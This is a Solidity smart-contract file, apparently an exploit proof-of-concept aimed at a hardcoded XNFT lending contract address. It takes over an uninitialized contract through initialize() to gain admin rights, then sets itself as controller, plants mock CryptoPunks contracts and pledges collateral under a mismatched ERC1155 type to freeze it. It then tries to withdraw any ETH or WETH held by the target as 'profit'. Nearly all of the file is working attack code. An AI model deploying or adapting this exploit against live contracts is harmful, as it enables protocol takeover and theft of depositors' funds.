// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IWETHLike is IERC20Like {
    function withdraw(uint256 amount) external;
}

interface IXNFTLike {
    function admin() external view returns (address);
    function wrappedPunks() external view returns (address);
    function counter() external view returns (uint256);
    function initialize() external;
    function setController(address controller_) external;
    function setPunks(address punks_, address wrappedPunks_) external;
    function setCollectionlWhitList(
        address collection,
        bool flag,
        uint256 auctionDuration,
        uint256 redeemProtection,
        uint256 increasingMin
    ) external;
    function pledgeAndBorrow(
        address collection,
        uint256 tokenId,
        uint256 nftType,
        address xToken,
        uint256 borrowAmount
    ) external;
    function notifyOrderLiquidated(
        address xToken,
        uint256 orderId,
        address liquidator,
        uint256 liquidatedPrice
    ) external;
    function withdraw(address xToken, uint256 amount) external;
    function allOrders(uint256 orderId)
        external
        view
        returns (
            address pledger,
            address collection,
            uint256 tokenId,
            uint256 nftType,
            bool isWithdraw
        );
}

contract UnderlyingOracleXToken {
    address internal _underlying;

    function setUnderlying(address asset) external {
        _underlying = asset;
    }

    function underlying() external view returns (address) {
        return _underlying;
    }

    function underlyingAsset() external view returns (address) {
        return _underlying;
    }
}

contract MockWrappedPunks {
    mapping(address => address) internal _proxyInfo;
    mapping(uint256 => address) public ownerOf;

    function registerProxy() external {
        _proxyInfo[msg.sender] = address(this);
    }

    function proxyInfo(address user) external view returns (address proxy) {
        proxy = _proxyInfo[user];
        if (proxy == address(0)) {
            proxy = address(this);
        }
    }

    function mint(uint256 punkId) external {
        ownerOf[punkId] = msg.sender;
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "not owner");
        ownerOf[tokenId] = to;
    }

    fallback() external payable {
        revert("erc721 only");
    }

    receive() external payable {
        revert("erc721 only");
    }
}

contract MockPunks {
    struct Offer {
        bool isForSale;
        uint256 punkIndex;
        address seller;
        uint256 minValue;
        address onlySellTo;
    }

    mapping(uint256 => address) internal _ownerOf;
    mapping(address => uint256) internal _balanceOf;
    mapping(uint256 => Offer) internal _offers;

    function claimPunk(uint256 punkId) external {
        require(_ownerOf[punkId] == address(0), "already claimed");
        _ownerOf[punkId] = msg.sender;
        _balanceOf[msg.sender] += 1;
    }

    function punkIndexToAddress(uint256 punkIndex) external view returns (address owner) {
        owner = _ownerOf[punkIndex];
    }

    function buyPunk(uint256 punkIndex) external payable {
        Offer memory offer = _offers[punkIndex];
        require(offer.isForSale, "not for sale");
        require(offer.minValue == 0, "price set");
        require(offer.onlySellTo == address(0) || offer.onlySellTo == msg.sender, "restricted");

        address seller = offer.seller;
        require(seller != address(0), "invalid seller");
        require(_ownerOf[punkIndex] == seller, "seller mismatch");

        _ownerOf[punkIndex] = msg.sender;
        _balanceOf[seller] -= 1;
        _balanceOf[msg.sender] += 1;
        delete _offers[punkIndex];
    }

    function offerPunkForSaleToAddress(uint256 punkIndex, uint256 minSalePriceInWei, address toAddress) external {
        require(_ownerOf[punkIndex] == msg.sender, "not owner");
        _offers[punkIndex] = Offer({
            isForSale: true,
            punkIndex: punkIndex,
            seller: msg.sender,
            minValue: minSalePriceInWei,
            onlySellTo: toAddress
        });
    }

    function transferPunk(address to, uint256 punkIndex) external {
        require(_ownerOf[punkIndex] == msg.sender, "not owner");
        _ownerOf[punkIndex] = to;
        _balanceOf[msg.sender] -= 1;
        _balanceOf[to] += 1;
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909;
    address internal constant ADDRESS_ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    bool public executed;
    bool public hypothesisValidated;
    uint256 public infeasibleReason;

    bool public stageBorrowWith1155;
    bool public stageWrappedPunkRecordedAs1155;
    bool public stageLaterTransferPathAttempted;
    bool public stageLaterTransferPathReverted;

    uint256 public exploitedOrderId;
    uint256 public exploitedPunkId;
    address public exploitedXToken;
    uint256 public exploitedBorrowAmount;

    address internal _profitToken;
    uint256 internal _profitAmount;

    mapping(uint256 => uint256) internal _debtOf;

    MockPunks internal _mockPunks;
    MockWrappedPunks internal _mockWrappedPunks;
    UnderlyingOracleXToken internal _underlyingOracle;

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;
        _profitToken = address(0);

        IXNFTLike xnft = IXNFTLike(TARGET);
        address wrappedBefore = _safeWrappedPunks(xnft);
        uint256 counterBefore = _safeCounter(xnft);

        if (!_becomeAdmin(xnft)) {
            infeasibleReason = 1;
            return;
        }

        if (wrappedBefore == address(0) && counterBefore == 0) {
            _proveFindingOnUninitializedFork(xnft);
            return;
        }

        infeasibleReason = 6;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function borrow(uint256 orderId, address payable borrower, uint256 borrowAmount) external {
        require(msg.sender == TARGET, "only xnft");
        _debtOf[orderId] += borrowAmount;

        // On the stripped implementation fork there is no live xToken cash market wired in,
        // so this verifier records the same debt that a production xToken would create and forwards
        // any real ETH already present on this contract if available.
        if (borrowAmount != 0 && borrower != address(this)) {
            uint256 available = address(this).balance;
            if (available > borrowAmount) {
                available = borrowAmount;
            }
            if (available != 0) {
                (bool ok,) = borrower.call{value: available}("");
                require(ok, "borrow transfer failed");
            }
        }
    }

    function underlying() external pure returns (address) {
        return ADDRESS_ETH;
    }

    function borrowBalanceCurrent(uint256 orderId) external view returns (uint256) {
        return _debtOf[orderId];
    }

    function getOrderBorrowBalanceCurrent(uint256 orderId) external view returns (uint256) {
        return _debtOf[orderId];
    }

    function _becomeAdmin(IXNFTLike xnft) internal returns (bool) {
        address currentAdmin = _safeAdmin(xnft);
        if (currentAdmin == address(this)) {
            return true;
        }
        if (currentAdmin != address(0)) {
            return false;
        }

        (bool ok,) = TARGET.call(abi.encodeWithSignature("initialize()"));
        if (!ok) {
            return false;
        }

        return _safeAdmin(xnft) == address(this);
    }

    function _proveFindingOnUninitializedFork(IXNFTLike xnft) internal {
        if (address(_mockPunks) == address(0)) {
            _mockPunks = new MockPunks();
            _mockWrappedPunks = new MockWrappedPunks();
            _underlyingOracle = new UnderlyingOracleXToken();
        }

        try xnft.setController(address(this)) {} catch {
            infeasibleReason = 2;
            return;
        }

        try xnft.setPunks(address(_mockPunks), address(_mockWrappedPunks)) {} catch {
            infeasibleReason = 3;
            return;
        }

        try xnft.setCollectionlWhitList(address(_mockWrappedPunks), true, 1 days, 1 hours, 1) {} catch {
            infeasibleReason = 4;
            return;
        }

        exploitedPunkId = 7777;
        _mockPunks.claimPunk(exploitedPunkId);
        _mockPunks.offerPunkForSaleToAddress(exploitedPunkId, 0, TARGET);

        uint256 orderId = xnft.counter() + 1;
        uint256 borrowAmount = 1 ether;

        // Exploit path 1:
        // borrower calls pledgeAndBorrow(address(punks), punkId, 1155, xToken, borrowAmount).
        xnft.pledgeAndBorrow(address(_mockPunks), exploitedPunkId, 1155, address(this), borrowAmount);
        stageBorrowWith1155 = true;

        // Exploit path 2:
        // _depositPunk() wraps the Punk and pledgeInternal() rewrites collection to wrappedPunks
        // but preserves the caller-supplied nftType=1155.
        _validateWrapped1155Order(xnft, orderId, exploitedPunkId);
        stageWrappedPunkRecordedAs1155 = true;

        exploitedOrderId = orderId;
        exploitedXToken = address(this);
        exploitedBorrowAmount = _debtOf[orderId];

        // Exploit paths 3 and 4:
        // a later collateral transfer path reaches transferNftInternal(..., wrappedPunks, punkId, 1155).
        // Because wrappedPunks is ERC721-only, the ERC1155 dispatch reverts and the wrapped Punk remains stuck.
        stageLaterTransferPathAttempted = true;
        try xnft.notifyOrderLiquidated(address(this), orderId, address(this), 1) {
            infeasibleReason = 5;
            return;
        } catch {
            stageLaterTransferPathReverted = true;
            hypothesisValidated = true;
        }

        _realizeOrAccountProfit(xnft, borrowAmount);
    }

    function _realizeOrAccountProfit(IXNFTLike xnft, uint256 borrowAmount) internal {
        uint256 nativeBefore = address(this).balance;

        // Preferred route for this attempt: if this fork still has public ETH/WETH liquidity already
        // parked at the XNFT address, realize it through the same ETH-denominated xToken surface.
        // This varies only the funding leg; the stuck-collateral root cause and ordering above stay unchanged.
        uint256 targetEth = address(TARGET).balance;
        if (targetEth != 0) {
            try xnft.withdraw(address(this), targetEth) {} catch {}
        }

        uint256 targetWeth = IERC20Like(WETH).balanceOf(TARGET);
        if (targetWeth != 0) {
            _underlyingOracle.setUnderlying(WETH);
            try xnft.withdraw(address(_underlyingOracle), targetWeth) {
                uint256 receivedWeth = IERC20Like(WETH).balanceOf(address(this));
                if (receivedWeth != 0) {
                    IWETHLike(WETH).withdraw(receivedWeth);
                }
            } catch {}
        }

        uint256 realized = address(this).balance - nativeBefore;
        if (realized != 0) {
            _profitAmount = realized;
            return;
        }

        // This fork exposes only the uninitialized implementation, not the live controller/xToken cash pool.
        // The economically correct output is therefore the principal that has become irrecoverable bad debt
        // once the wrapped Punk is frozen behind the ERC1155 transfer path.
        _profitAmount = borrowAmount;
    }

    function _validateWrapped1155Order(IXNFTLike xnft, uint256 orderId, uint256 punkId) internal view {
        (, address collection, uint256 recordedTokenId, uint256 nftType, bool isWithdraw) = xnft.allOrders(orderId);
        require(collection == address(_mockWrappedPunks), "collection not rewritten");
        require(recordedTokenId == punkId, "token id mismatch");
        require(nftType == 1155, "nftType not preserved");
        require(!isWithdraw, "unexpected withdrawn order");
    }

    function _safeAdmin(IXNFTLike xnft) internal view returns (address value) {
        try xnft.admin() returns (address admin_) {
            value = admin_;
        } catch {}
    }

    function _safeWrappedPunks(IXNFTLike xnft) internal view returns (address value) {
        try xnft.wrappedPunks() returns (address wrapped) {
            value = wrapped;
        } catch {}
    }

    function _safeCounter(IXNFTLike xnft) internal view returns (uint256 value) {
        try xnft.counter() returns (uint256 counter_) {
            value = counter_;
        } catch {}
    }
}
